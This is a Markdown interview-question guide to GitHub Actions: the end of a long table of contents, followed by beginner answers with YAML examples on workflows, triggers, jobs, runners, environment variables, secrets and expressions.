- [335: What SLSA level can you reach with GitHub Actions?](#335-what-slsa-level-can-you-reach-with-github-actions)
- [336: How do you generate an SBOM in a workflow?](#336-how-do-you-generate-an-sbom-in-a-workflow)
- [337: How do you sign container images with cosign in Actions?](#337-how-do-you-sign-container-images-with-cosign-in-actions)
- [338: How do you scan container images and fail the build on serious vulnerabilities?](#338-how-do-you-scan-container-images-and-fail-the-build-on-serious-vulnerabilities)
- [339: How do you reduce the risk of malicious install scripts in CI?](#339-how-do-you-reduce-the-risk-of-malicious-install-scripts-in-ci)
- [340: How would you design a secure deploy pipeline end to end?](#340-how-would-you-design-a-secure-deploy-pipeline-end-to-end)
- [341: How would you design releases for a monorepo with many packages?](#341-how-would-you-design-releases-for-a-monorepo-with-many-packages)
- [342: How do you build once and deploy the same artifact everywhere?](#342-how-do-you-build-once-and-deploy-the-same-artifact-everywhere)
- [343: How do you handle database migrations in a deployment workflow?](#343-how-do-you-handle-database-migrations-in-a-deployment-workflow)
- [344: How do you roll back a deployment using GitHub Actions?](#344-how-do-you-roll-back-a-deployment-using-github-actions)
- [345: How do you implement a canary deployment with Actions?](#345-how-do-you-implement-a-canary-deployment-with-actions)
- [346: How do you deploy to many regions or clusters?](#346-how-do-you-deploy-to-many-regions-or-clusters)
- [347: How do you avoid race conditions between deploys?](#347-how-do-you-avoid-race-conditions-between-deploys)
- [348: Why aren't concurrency groups a real queue, and what can you do about it?](#348-why-arent-concurrency-groups-a-real-queue-and-what-can-you-do-about-it)
- [349: How do you speed up CI for a large monorepo?](#349-how-do-you-speed-up-ci-for-a-large-monorepo)
- [350: How do you design cache keys to get more hits?](#350-how-do-you-design-cache-keys-to-get-more-hits)
- [351: When can caching make a workflow slower?](#351-when-can-caching-make-a-workflow-slower)
- [352: How do you deal with the repository cache size limit?](#352-how-do-you-deal-with-the-repository-cache-size-limit)
- [353: How do you make checkout fast for a very large repository?](#353-how-do-you-make-checkout-fast-for-a-very-large-repository)
- [354: How do you speed up Docker image builds in CI?](#354-how-do-you-speed-up-docker-image-builds-in-ci)
- [355: How do you measure CI performance over time?](#355-how-do-you-measure-ci-performance-over-time)
- [356: How do you reduce the time jobs wait in the queue?](#356-how-do-you-reduce-the-time-jobs-wait-in-the-queue)
- [357: How do you work within the 256 jobs per matrix limit?](#357-how-do-you-work-within-the-256-jobs-per-matrix-limit)
- [358: What do you do when a job needs more than 6 hours?](#358-what-do-you-do-when-a-job-needs-more-than-6-hours)
- [359: What API rate limits matter in workflows?](#359-what-api-rate-limits-matter-in-workflows)
- [360: How would you design a shared library of reusable workflows for an organization?](#360-how-would-you-design-a-shared-library-of-reusable-workflows-for-an-organization)
- [361: How do you roll out a change to a shared workflow safely?](#361-how-do-you-roll-out-a-change-to-a-shared-workflow-safely)
- [362: What are the common pitfalls of composite actions?](#362-what-are-the-common-pitfalls-of-composite-actions)
- [363: Why do JavaScript actions commit a bundled dist folder?](#363-why-do-javascript-actions-commit-a-bundled-dist-folder)
- [364: How does a Docker action receive its inputs?](#364-how-does-a-docker-action-receive-its-inputs)
- [365: What are the trade-offs between JavaScript, Docker and composite actions?](#365-what-are-the-trade-offs-between-javascript-docker-and-composite-actions)
- [366: How do you share state between the pre, main and post parts of a JavaScript action?](#366-how-do-you-share-state-between-the-pre-main-and-post-parts-of-a-javascript-action)
- [367: How do you make an action work on both GitHub.com and GitHub Enterprise Server?](#367-how-do-you-make-an-action-work-on-both-githubcom-and-github-enterprise-server)
- [368: How does the Node.js runtime for JavaScript actions get upgraded?](#368-how-does-the-nodejs-runtime-for-javascript-actions-get-upgraded)
- [369: What happens if an action still declares an old Node.js runtime?](#369-what-happens-if-an-action-still-declares-an-old-nodejs-runtime)
- [370: How do you avoid breakage from hosted runner image updates?](#370-how-do-you-avoid-breakage-from-hosted-runner-image-updates)
- [371: How do you make builds reproducible in GitHub Actions?](#371-how-do-you-make-builds-reproducible-in-github-actions)
- [372: How do you make workflows safe to re-run?](#372-how-do-you-make-workflows-safe-to-re-run)
- [373: What does a re-run reuse from the original run, and what does it not?](#373-what-does-a-re-run-reuse-from-the-original-run-and-what-does-it-not)
- [374: Why do outputs from matrix jobs get overwritten, and how do you collect them?](#374-why-do-outputs-from-matrix-jobs-get-overwritten-and-how-do-you-collect-them)
- [375: How do you write cleanup that runs even when a workflow is cancelled?](#375-how-do-you-write-cleanup-that-runs-even-when-a-workflow-is-cancelled)
- [376: What happens to running processes when a job is cancelled or times out?](#376-what-happens-to-running-processes-when-a-job-is-cancelled-or-times-out)
- [377: How do you keep persistent self-hosted runners clean between jobs?](#377-how-do-you-keep-persistent-self-hosted-runners-clean-between-jobs)
- [378: How do you design CI for an open source project with outside contributors?](#378-how-do-you-design-ci-for-an-open-source-project-with-outside-contributors)
- [379: What are the options for approving workflow runs from outside contributors?](#379-what-are-the-options-for-approving-workflow-runs-from-outside-contributors)
- [380: How can environments protect secrets in pull request workflows?](#380-how-can-environments-protect-secrets-in-pull-request-workflows)
- [381: Can someone with write access steal secrets by editing a workflow in a branch?](#381-can-someone-with-write-access-steal-secrets-by-editing-a-workflow-in-a-branch)
- [382: How do you protect the workflow files themselves?](#382-how-do-you-protect-the-workflow-files-themselves)
- [383: How do you handle secret rotation for workflows?](#383-how-do-you-handle-secret-rotation-for-workflows)
- [384: How do you use an external secret manager from Actions?](#384-how-do-you-use-an-external-secret-manager-from-actions)
- [385: How do you use a GitHub App for automation across repositories?](#385-how-do-you-use-a-github-app-for-automation-across-repositories)
- [386: How do you trigger a workflow in another repository and wait for the result?](#386-how-do-you-trigger-a-workflow-in-another-repository-and-wait-for-the-result)
- [387: How long is GITHUB_TOKEN valid?](#387-how-long-is-github_token-valid)
- [388: What organization-level Actions settings would you set?](#388-what-organization-level-actions-settings-would-you-set)
- [389: How do you audit how Actions is used in an organization?](#389-how-do-you-audit-how-actions-is-used-in-an-organization)
- [390: How do you control Actions spending?](#390-how-do-you-control-actions-spending)
- [391: How do you choose between larger hosted runners and self-hosted runners?](#391-how-do-you-choose-between-larger-hosted-runners-and-self-hosted-runners)
- [392: How do you run GPU workloads in GitHub Actions?](#392-how-do-you-run-gpu-workloads-in-github-actions)
- [393: How can GitHub-hosted runners reach private resources in your cloud?](#393-how-can-github-hosted-runners-reach-private-resources-in-your-cloud)
- [394: When do you need static IP addresses for runners, and how do you get them?](#394-when-do-you-need-static-ip-addresses-for-runners-and-how-do-you-get-them)
- [395: How do you access a private database from a workflow securely?](#395-how-do-you-access-a-private-database-from-a-workflow-securely)
- [396: How would you structure CI/CD for a repository with many microservices?](#396-how-would-you-structure-cicd-for-a-repository-with-many-microservices)
- [397: Pull request CI takes 40 minutes. How would you get it down to 10?](#397-pull-request-ci-takes-40-minutes-how-would-you-get-it-down-to-10)
- [398: Jobs fail with "No space left on device". What do you do?](#398-jobs-fail-with-no-space-left-on-device-what-do-you-do)
- [399: The cache never seems to hit. How do you debug it?](#399-the-cache-never-seems-to-hit-how-do-you-debug-it)
- [400: A workflow didn't trigger at all. How do you find out why?](#400-a-workflow-didnt-trigger-at-all-how-do-you-find-out-why)
- [401: You renamed a job and now pull requests are blocked waiting for a check. What happened?](#401-you-renamed-a-job-and-now-pull-requests-are-blocked-waiting-for-a-check-what-happened)
- [402: Secrets are empty in a pull request workflow. Why?](#402-secrets-are-empty-in-a-pull-request-workflow-why)
- [403: Two deploys to production ran at the same time. How do you prevent it?](#403-two-deploys-to-production-ran-at-the-same-time-how-do-you-prevent-it)
- [404: A scheduled workflow stopped running. What could be the cause?](#404-a-scheduled-workflow-stopped-running-what-could-be-the-cause)
- [405: A step fails with "Resource not accessible by integration". What does it mean?](#405-a-step-fails-with-resource-not-accessible-by-integration-what-does-it-mean)
- [406: A third-party action you use was compromised. What do you do?](#406-a-third-party-action-you-use-was-compromised-what-do-you-do)
- [407: A job hangs until it hits the timeout. How do you find out why?](#407-a-job-hangs-until-it-hits-the-timeout-how-do-you-find-out-why)
- [408: Tests pass locally but fail in CI. How do you approach it?](#408-tests-pass-locally-but-fail-in-ci-how-do-you-approach-it)
- [409: How would you migrate a project from Jenkins or another CI tool to GitHub Actions?](#409-how-would-you-migrate-a-project-from-jenkins-or-another-ci-tool-to-github-actions)
- [410: What is GitHub Actions Importer?](#410-what-is-github-actions-importer)
- [411: Jobs for self-hosted runners stay queued forever. What do you check?](#411-jobs-for-self-hosted-runners-stay-queued-forever-what-do-you-check)
- [412: Builds fail with Docker Hub rate limit errors. How do you fix it?](#412-builds-fail-with-docker-hub-rate-limit-errors-how-do-you-fix-it)
- [413: How do you report a workflow_run result back to the pull request?](#413-how-do-you-report-a-workflow_run-result-back-to-the-pull-request)
- [414: How do you create a check run with annotations through the API?](#414-how-do-you-create-a-check-run-with-annotations-through-the-api)
- [415: How can you add a manual approval in the middle of a pipeline?](#415-how-can-you-add-a-manual-approval-in-the-middle-of-a-pipeline)
- [416: How do environments work in reusable workflows?](#416-how-do-environments-work-in-reusable-workflows)
- [417: How do token permissions work between a caller and a reusable workflow?](#417-how-do-token-permissions-work-between-a-caller-and-a-reusable-workflow)
- [418: How do comparisons and type conversion work in expressions?](#418-how-do-comparisons-and-type-conversion-work-in-expressions)
- [419: What are the gotchas with boolean inputs?](#419-what-are-the-gotchas-with-boolean-inputs)
- [420: Why is this if condition always true: if: ${{ inputs.env }} == 'prod'?](#420-why-is-this-if-condition-always-true-if--inputsenv---prod)
- [421: How does github.ref differ between events?](#421-how-does-githubref-differ-between-events)
- [422: What are github.head_ref, github.base_ref and github.ref_name?](#422-what-are-githubhead_ref-githubbase_ref-and-githubref_name)
- [423: How did pull_request_target change in late 2025?](#423-how-did-pull_request_target-change-in-late-2025)
- [424: How do you avoid infinite loops in workflows that push commits?](#424-how-do-you-avoid-infinite-loops-in-workflows-that-push-commits)
- [425: Can you keep a secret away from other steps in the same job?](#425-can-you-keep-a-secret-away-from-other-steps-in-the-same-job)
- [426: What is zizmor and how does it help?](#426-what-is-zizmor-and-how-does-it-help)
- [427: How do you test changes to a workflow before merging them?](#427-how-do-you-test-changes-to-a-workflow-before-merging-them)
- [428: How do you keep action versions up to date across many repositories?](#428-how-do-you-keep-action-versions-up-to-date-across-many-repositories)
- [429: How would you design CI/CD for a full stack app (frontend, backend, database)?](#429-how-would-you-design-cicd-for-a-full-stack-app-frontend-backend-database)
- [430: How do you handle preview environments that need a database?](#430-how-do-you-handle-preview-environments-that-need-a-database)
- [431: How does GitHub Actions compare to GitLab CI in design?](#431-how-does-github-actions-compare-to-gitlab-ci-in-design)
- [432: When would GitHub Actions not be the right tool?](#432-when-would-github-actions-not-be-the-right-tool)
- [433: How does a merge queue change how you design CI?](#433-how-does-a-merge-queue-change-how-you-design-ci)
- [434: How would you set up a scheduled release train with Actions?](#434-how-would-you-set-up-a-scheduled-release-train-with-actions)
- [435: How do you share one long-lived test environment between pull requests safely?](#435-how-do-you-share-one-long-lived-test-environment-between-pull-requests-safely)
- [436: What is the difference between github.actor and github.triggering_actor?](#436-what-is-the-difference-between-githubactor-and-githubtriggering_actor)
- [437: Why is checking github.actor == 'dependabot[bot]' risky?](#437-why-is-checking-githubactor--dependabotbot-risky)
- [438: How do you make sure releases are only built from reviewed code on main?](#438-how-do-you-make-sure-releases-are-only-built-from-reviewed-code-on-main)
- [439: What are the risks of workflow_dispatch with a ref?](#439-what-are-the-risks-of-workflow_dispatch-with-a-ref)
- [440: What are the security concerns with job containers and Docker on runners?](#440-what-are-the-security-concerns-with-job-containers-and-docker-on-runners)
- [441: How do you build images on Kubernetes runners without privileged containers?](#441-how-do-you-build-images-on-kubernetes-runners-without-privileged-containers)
- [442: How do you deal with time zones and daylight saving time in schedules?](#442-how-do-you-deal-with-time-zones-and-daylight-saving-time-in-schedules)
- [443: What is the TOCTOU problem in label or approval based workflows?](#443-what-is-the-toctou-problem-in-label-or-approval-based-workflows)
- [444: How should you handle GitHub Actions outages in your delivery process?](#444-how-should-you-handle-github-actions-outages-in-your-delivery-process)
- [445: How do you run AI-based code review or agents in GitHub Actions safely?](#445-how-do-you-run-ai-based-code-review-or-agents-in-github-actions-safely)
- [446: How do you limit what a workflow can do when it creates pull requests?](#446-how-do-you-limit-what-a-workflow-can-do-when-it-creates-pull-requests)
- [447: How do you investigate a run where secrets might have leaked?](#447-how-do-you-investigate-a-run-where-secrets-might-have-leaked)
- [448: What are the main limits of GitHub Actions you should know by heart?](#448-what-are-the-main-limits-of-github-actions-you-should-know-by-heart)
- [449: What changed in GitHub Actions recently that you should know about?](#449-what-changed-in-github-actions-recently-that-you-should-know-about)
- [450: What good practices do you apply to every workflow?](#450-what-good-practices-do-you-apply-to-every-workflow)

---

# Easy Questions (1-150)

## 1: What is GitHub Actions?

GitHub Actions is the CI/CD and automation service built into GitHub. You describe what should happen in YAML files inside your repository, and GitHub runs those steps on a machine (a runner) when something happens in the repo, like a push, a pull request or a schedule.

People use it to run tests, build and publish packages, build Docker images, deploy apps, and automate repo chores like labeling issues or closing stale pull requests.

## 2: What is CI/CD and how does GitHub Actions fit in?

CI (continuous integration) means every change is built and tested automatically, so problems show up early. CD (continuous delivery or deployment) means the tested code is packaged and shipped to an environment automatically, or with a single approval.

GitHub Actions does both. A typical setup has one workflow that runs lint and tests on every pull request, and another that builds and deploys when code is merged to `main`. Because it lives in the same place as the code, there is no separate CI server to install or maintain.

## 3: What is a workflow?

A workflow is an automated process defined in a YAML file. It says which events start it, and which jobs and steps it runs.

A repository can have many workflows, for example `ci.yml` for tests, `deploy.yml` for deployments and `release.yml` for publishing. Each one runs on its own and has its own history in the Actions tab.

## 4: Where do workflow files live?

Workflow files go in the `.github/workflows/` folder at the root of the repository. They must have a `.yml` or `.yaml` extension.

```
my-repo/
  .github/
    workflows/
      ci.yml
      deploy.yml
  src/
  package.json
```

GitHub only picks up files directly in that folder. Files in subfolders of `.github/workflows/` are ignored.

## 5: What is an event in GitHub Actions?

An event is something that happens and starts a workflow. Examples are a push, a pull request being opened, a new release, a comment on an issue, a manual click on "Run workflow", or a cron schedule.

You list events under the `on` key:

```yaml
on:
  push:
  pull_request:
```

## 6: What is a job?

A job is a group of steps that run on the same runner. Each job gets a fresh machine (on GitHub-hosted runners), so steps in one job can share files, but different jobs cannot unless you pass data between them.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "This is the test job"
```

A workflow can have many jobs. By default they run in parallel.

## 7: What is a step?

A step is a single task inside a job. It either runs a shell command with `run` or uses an action with `uses`. Steps run one after another, in the order you write them.

```yaml
steps:
  - uses: actions/checkout@v6
  - run: npm ci
  - run: npm test
```

If a step fails, the following steps are skipped by default and the job is marked as failed.

## 8: What is an action?

An action is a reusable piece of code that does a specific task, like checking out the repo, installing Node.js or uploading a file. You use it in a step with the `uses` key.

Actions can be written in JavaScript, as a Docker container, or as a composite action (a set of steps). They can come from the GitHub Marketplace, from another repository, or from a folder in your own repository.

## 9: What is a runner?

A runner is the machine that runs a job. It has the runner application installed, which picks up jobs from GitHub, runs the steps and sends logs and results back.

GitHub provides hosted runners with Linux, Windows and macOS. You can also install the runner application on your own machine, which is called a self-hosted runner.

## 10: What is the difference between GitHub-hosted and self-hosted runners?

**GitHub-hosted runners** are virtual machines that GitHub manages. Each job gets a clean VM that is thrown away after the job. You don't maintain anything, and they come with many tools preinstalled. You pay per minute in private repos.

**Self-hosted runners** are machines you run yourself (a server, a VM, a Kubernetes pod). You control the hardware, the installed software and the network access, so they are useful for special hardware, private networks or cost reasons. But you are responsible for updates, security and cleanup.

## 11: What does a basic workflow file look like?

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version: 24
      - run: npm ci
      - run: npm test
```

This runs on pushes to `main` and on every pull request. It checks out the code, installs Node.js, installs dependencies and runs the tests.

## 12: What does the on key do?

The `on` key lists the events that start the workflow. It can be a single event, a list, or a map with filters for each event.

```yaml
on: push
```

```yaml
on: [push, pull_request]
```

```yaml
on:
  push:
    branches: [main]
  workflow_dispatch:
```

## 13: What does runs-on do?

`runs-on` picks the type of machine the job runs on. For GitHub-hosted runners you give a label like `ubuntu-latest`, `windows-latest` or `macos-latest`. For self-hosted runners you give the labels you assigned to them.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
```

```yaml
jobs:
  build:
    runs-on: [self-hosted, linux, x64]
```

## 14: What is the difference between uses and run in a step?

`run` executes shell commands directly on the runner. `uses` runs an action, which is someone's packaged code.

```yaml
steps:
  - uses: actions/checkout@v6 # an action
  - run: npm test # a shell command
```

A step can have one or the other, not both. Use `with` to pass inputs to an action, and `env` to pass environment variables to either.

## 15: What does actions/checkout do?

It clones your repository into the runner's workspace (`$GITHUB_WORKSPACE`), so the following steps can work with your code. By default it checks out the commit that triggered the workflow, with a shallow history of one commit.

```yaml
- uses: actions/checkout@v6
```

You can change what it checks out with inputs like `ref`, `repository`, `fetch-depth` and `path`.

## 16: Why do you need to check out the code in most workflows?

The runner starts with an empty workspace. Your repository is not there automatically. If a step needs your source files, like running tests or building the app, you have to check out the code first.

Some workflows don't need it. For example, a workflow that only calls the GitHub API to label an issue can skip the checkout step.

## 17: What is the GitHub Marketplace for actions?

The Marketplace is a public list of actions published by GitHub, companies and the community. You can search it for things like "deploy to AWS", "setup Python" or "send Slack message".

Actions from verified creators have a badge, but even then you should read what the action does and what permissions it needs before using it. Anyone can publish an action, so treat them like any other third-party dependency.

## 18: How do you reference an action version?

You add `@` and a ref after the action name. The ref can be a tag, a branch or a commit SHA.

```yaml
- uses: actions/checkout@v6 # major version tag
- uses: actions/checkout@v6.0.1 # exact version tag
- uses: actions/checkout@8e8c483db84b4bee98b60c0593521ed34d9990e8 # full commit SHA
```

A major tag like `v6` moves to the latest v6 release, so you get fixes automatically. A full commit SHA can never change, so it is the safest option for third-party actions. Avoid branches like `@main` because the code can change at any time.

## 19: What does the name key do in a workflow?

At the top level, `name` is the workflow's display name in the Actions tab. If you leave it out, GitHub shows the file path instead.

`name` can also be set on jobs and steps, which makes the logs and the pull request checks easier to read.

```yaml
name: CI

jobs:
  test:
    name: Unit tests
    runs-on: ubuntu-latest
    steps:
      - name: Install dependencies
        run: npm ci
```

## 20: What is run-name?

`run-name` sets the title of each individual run in the Actions tab. It can use expressions, so you can show who started the run or which input was used.

```yaml
name: Deploy
run-name: Deploy to ${{ inputs.environment }} by @${{ github.actor }}

on:
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]
```

Without it, the run title is usually the commit message or the pull request title.

## 21: How do you trigger a workflow on push?

Use the `push` event. Without filters it runs on a push to any branch or tag.

```yaml
on:
  push:
```

Most projects limit it to certain branches:

```yaml
on:
  push:
    branches:
      - main
      - "release/**"
```

## 22: How do you trigger a workflow on pull requests?

Use the `pull_request` event. By default it runs when a pull request is opened, when new commits are pushed to it (`synchronize`), and when it is reopened.

```yaml
on:
  pull_request:
    branches: [main]
```

Here `branches` filters by the **target** branch of the pull request, not the source branch. So this runs for any pull request that wants to merge into `main`.

## 23: How do you run a workflow manually?

Add the `workflow_dispatch` event. A "Run workflow" button then appears in the Actions tab, and you can also start it with the GitHub CLI or the REST API.

```yaml
on:
  workflow_dispatch:
    inputs:
      dry-run:
        type: boolean
        default: true
```

The workflow file must exist on the default branch for the button to show up.

## 24: How do you run a workflow on a schedule?

Use the `schedule` event with a cron expression. Times are in UTC.

```yaml
on:
  schedule:
    - cron: "0 3 * * *" # every day at 03:00 UTC
```

The five fields are minute, hour, day of month, month and day of week. The shortest interval allowed is every 5 minutes. Scheduled runs always use the latest commit on the default branch, and they can be delayed when GitHub is under heavy load.

## 25: How do you limit a workflow to certain branches?

Use `branches` or `branches-ignore` under `push` or `pull_request`. Glob patterns are allowed.

```yaml
on:
  push:
    branches:
      - main
      - "feature/**"
  pull_request:
    branches-ignore:
      - "docs/**"
```

For `push`, the filter checks the branch that was pushed. For `pull_request`, it checks the base (target) branch.

## 26: How do you run a workflow only when certain files change?

Use `paths` or `paths-ignore`.

```yaml
on:
  push:
    paths:
      - "src/**"
      - "package.json"
  pull_request:
    paths-ignore:
      - "**.md"
      - "docs/**"
```

If you use both `branches` and `paths` on the same event, both filters must match for the workflow to run.

## 27: What is the difference between branches and branches-ignore?

`branches` is an allow list: the workflow runs only for branches that match. `branches-ignore` is a block list: the workflow runs for every branch except the ones that match.

You can't use both for the same event. If you need to include some branches and exclude a few of them, use `branches` with a `!` pattern:

```yaml
on:
  push:
    branches:
      - "release/**"
      - "!release/**-alpha"
```

Order matters here. A later pattern can override an earlier one.

## 28: How do you trigger a workflow when a tag is pushed?

Use `tags` under the `push` event.

```yaml
on:
  push:
    tags:
      - "v*"
```

This runs when you push a tag like `v1.2.0`. In the run, `github.ref` will be `refs/tags/v1.2.0` and `github.ref_name` will be `v1.2.0`.

If you only set `tags`, pushes to branches will not trigger the workflow. If you only set `branches`, pushes of tags will not trigger it.

## 29: How do you trigger a workflow on a release?

Use the `release` event with the activity types you care about. `published` is the most common one.

```yaml
on:
  release:
    types: [published]
```

`published` fires when a release (including a pre-release) is made public. It is a good place to build and upload release assets or publish a package.

## 30: Can a workflow have multiple triggers?

Yes. List as many events as you want under `on`. The workflow runs when any of them happens.

```yaml
on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:
  schedule:
    - cron: "0 6 * * 1"
```

Inside the workflow you can check `github.event_name` to do different things depending on what started it.

## 31: What are activity types in events?

Many events have activity types that tell you more about what happened. For example, `pull_request` has `opened`, `synchronize`, `reopened`, `closed`, `labeled` and more. `issues` has `opened`, `edited`, `closed` and others.

You pick which ones you want with `types`:

```yaml
on:
  pull_request:
    types: [opened, synchronize, reopened, labeled]
  issues:
    types: [opened]
```

If you don't set `types`, the event uses its default list. For `pull_request` that is `opened`, `synchronize` and `reopened`.

## 32: Do jobs run in parallel or in sequence by default?

In parallel. Every job without a `needs` key starts as soon as a runner is free.

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - run: echo lint
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo test
```

Here `lint` and `test` start at the same time. Steps inside a job always run in sequence.

## 33: How do you make one job wait for another?

Use `needs`. The job will start only after the listed jobs finish successfully.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm test
  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

`needs` can be a list: `needs: [lint, test]`. If any job in the list fails or is skipped, the dependent job is skipped too, unless you change that with an `if` condition.

## 34: How do you run multiple commands in one step?

Use a YAML block with `|`. Each line runs in the same shell, one after another.

```yaml
- name: Build
  run: |
    npm ci
    npm run build
    ls -la dist
```

With the default bash shell on Linux and macOS, the step stops at the first command that fails, because GitHub runs it with `bash -e`.

## 35: What shell does run use by default?

On Linux and macOS it uses `bash`. If bash is not found, it falls back to `sh`. On Windows the default is `pwsh` (PowerShell Core).

When you don't set `shell`, bash runs as `bash -e {0}`. If you set `shell: bash` explicitly, it runs as `bash --noprofile --norc -eo pipefail {0}`, which also fails the step when a command in a pipe fails. Many teams set `shell: bash` on purpose to get `pipefail`.

## 36: How do you change the shell for a step?

Use the `shell` key. Common values are `bash`, `sh`, `pwsh`, `powershell`, `cmd` and `python`.

```yaml
- name: Run with Python
  shell: python
  run: |
    import platform
    print(platform.system())

- name: Run with PowerShell
  shell: pwsh
  run: Get-ChildItem
```

You can also pass a custom command, like `shell: perl {0}`, where `{0}` is replaced with the path to the temporary script file.

## 37: What is working-directory?

It sets the folder a `run` step runs in. The path is relative to `$GITHUB_WORKSPACE`.

```yaml
- run: npm test
  working-directory: ./packages/api
```

You can set it for every `run` step in a job or the whole workflow with `defaults`:

```yaml
defaults:
  run:
    working-directory: ./packages/api
```

`working-directory` affects only `run` steps, not steps that use actions.

## 38: How do you set environment variables?

Use the `env` key at the workflow, job or step level.

```yaml
env:
  NODE_ENV: test

jobs:
  test:
    runs-on: ubuntu-latest
    env:
      LOG_LEVEL: debug
    steps:
      - run: echo "$NODE_ENV $LOG_LEVEL $PORT"
        env:
          PORT: 3000
```

If the same name is set at more than one level, the most specific one wins: step beats job, and job beats workflow.

## 39: What is the env context?

The `env` context holds the variables you set with the `env` key, so you can read them inside expressions:

```yaml
env:
  APP_NAME: shop

steps:
  - run: echo "Deploying ${{ env.APP_NAME }}"
  - if: env.APP_NAME == 'shop'
    run: echo "It's the shop"
```

Inside a `run` script you can also read them as normal shell variables (`$APP_NAME`). The difference is that `${{ env.APP_NAME }}` is replaced before the script runs, while `$APP_NAME` is read by the shell at run time.

## 40: What are default environment variables?

GitHub sets a list of variables on every runner. Some common ones:

- `GITHUB_SHA`: the commit SHA that triggered the run
- `GITHUB_REF`: the full ref, like `refs/heads/main`
- `GITHUB_REF_NAME`: the short name, like `main`
- `GITHUB_REPOSITORY`: `owner/repo`
- `GITHUB_ACTOR`: the user who triggered the run
- `GITHUB_WORKSPACE`: the folder where your code is checked out
- `GITHUB_RUN_ID` and `GITHUB_RUN_NUMBER`
- `GITHUB_EVENT_NAME` and `GITHUB_EVENT_PATH`
- `RUNNER_OS`, `RUNNER_ARCH`, `RUNNER_TEMP`
- `CI`, which is always `true`

Most of them are also available through the `github` and `runner` contexts.

## 41: What is GITHUB_WORKSPACE?

It is the default working folder for steps, and the place where `actions/checkout` puts your code. On GitHub-hosted Linux runners it is something like `/home/runner/work/my-repo/my-repo`.

You usually don't need the full path, because `run` steps already start in that folder. It is useful when a tool needs an absolute path, or when you check out several repositories into subfolders of the workspace.

## 42: What are GITHUB_SHA and GITHUB_REF?

`GITHUB_SHA` is the commit the workflow runs on. `GITHUB_REF` is the branch or tag ref that triggered it.

Their values depend on the event:

- `push` to `main`: `GITHUB_REF` is `refs/heads/main` and `GITHUB_SHA` is the pushed commit.
- push of tag `v1.0.0`: `GITHUB_REF` is `refs/tags/v1.0.0`.
- `pull_request`: `GITHUB_REF` is `refs/pull/42/merge` and `GITHUB_SHA` is a temporary merge commit of the PR branch into the base branch, not the last commit on the PR branch.

The last commit of the pull request branch is in `github.event.pull_request.head.sha`.

## 43: What are secrets in GitHub Actions?

Secrets are encrypted values, like API keys or passwords, that you store in GitHub and use in workflows. They are encrypted at rest, are not shown in the UI after you save them, and are hidden in logs.

They can be stored at the organization, repository or environment level. Workflows read them through the `secrets` context.

## 44: How do you create a repository secret?

In the repository, go to Settings, then Secrets and variables, then Actions, and click "New repository secret". Give it a name and a value.

You can also use the GitHub CLI:

```bash
gh secret set NPM_TOKEN
gh secret set NPM_TOKEN --body "abc123"
gh secret set DEPLOY_KEY < deploy_key.pem
```

Secret names can contain letters, numbers and underscores, can't start with a number, and can't start with `GITHUB_`.

## 45: How do you use a secret in a workflow?

Read it from the `secrets` context and pass it to a step through `env` or `with`.

```yaml
steps:
  - run: ./deploy.sh
    env:
      API_KEY: ${{ secrets.API_KEY }}

  - uses: some-org/some-action@v1
    with:
      token: ${{ secrets.SOME_TOKEN }}
```

Passing secrets through `env` is better than putting `${{ secrets.X }}` directly in the `run` script. It keeps the value out of the generated script file and avoids quoting problems.

## 46: What happens if you print a secret in the logs?

GitHub replaces it with `***` in the log output. It does this by searching the logs for the exact secret values.

This is a safety net, not a guarantee. If the secret is changed before printing, for example base64 encoded, split into parts, or printed one character at a time, it will not be masked. Don't print secrets at all, and don't rely on masking to protect them.

## 47: What are configuration variables (vars)?

Configuration variables are plain, non-secret values that you store in GitHub settings and read with the `vars` context. They can be set at the organization, repository or environment level.

```yaml
steps:
  - run: echo "Deploying to ${{ vars.DEPLOY_REGION }}"
```

They are useful for things like region names, feature flags or URLs that change between environments but don't need to be hidden.

## 48: What is the difference between secrets and variables?

Secrets are encrypted, masked in logs, and can't be read back in the UI. Variables are stored as plain text, shown in the UI and printed normally in logs.

Use secrets for anything sensitive: tokens, passwords, private keys. Use variables for normal configuration: region, app name, public URLs. Putting a password in a variable is a mistake, because anyone with access to the logs or settings can see it.

## 49: What is GITHUB_TOKEN?

`GITHUB_TOKEN` is a token that GitHub creates automatically for every workflow job. It lets the workflow call the GitHub API for the same repository, for example to comment on a pull request, create a release or push a commit.

You access it as `${{ secrets.GITHUB_TOKEN }}` or `${{ github.token }}`. It expires when the job finishes (or after 24 hours at most), and you control what it can do with the `permissions` key.

## 50: What are expressions?

Expressions let you compute values in a workflow file. They are written inside `${{ }}` and can use contexts, literals, operators and functions.

```yaml
- if: github.ref == 'refs/heads/main' && github.event_name == 'push'
  run: echo "Push to main"

- run: echo "Node ${{ matrix.node }} on ${{ runner.os }}"
```

They are used in `if` conditions, in `with` and `env` values, in `run` scripts, and in many other keys.

## 51: When can you leave out the ${{ }} around an expression?

In `if` conditions. GitHub always treats the value of `if` as an expression, so these two are the same:

```yaml
- if: github.event_name == 'push'
- if: ${{ github.event_name == 'push' }}
```

Everywhere else (`with`, `env`, `run`, `runs-on` and so on) you need `${{ }}`, otherwise the text is used as a plain string. One exception inside `if`: if the expression starts with `!`, wrap it in `${{ }}`, because `!` has a special meaning in YAML.

## 52: What are contexts?

Contexts are objects with information about the run that you can read in expressions. The main ones are:

- `github`: the event, repo, ref, SHA, actor and more
- `env`: variables set with `env`
- `vars`: configuration variables
- `secrets`: secrets
- `job`: info about the current job
- `steps`: outputs and results of earlier steps
- `runner`: info about the runner
- `strategy` and `matrix`: matrix settings and current values
- `needs`: outputs and results of jobs this job depends on
- `inputs`: inputs of a manual or reusable workflow

Not every context is available everywhere. For example, `secrets` can't be used in a job-level `if`.

## 53: What is the github context?

It has information about the run and the event that triggered it. Commonly used fields:

- `github.event_name`: like `push` or `pull_request`
- `github.ref`, `github.ref_name`, `github.sha`
- `github.repository`, `github.repository_owner`
- `github.actor`: who triggered the run
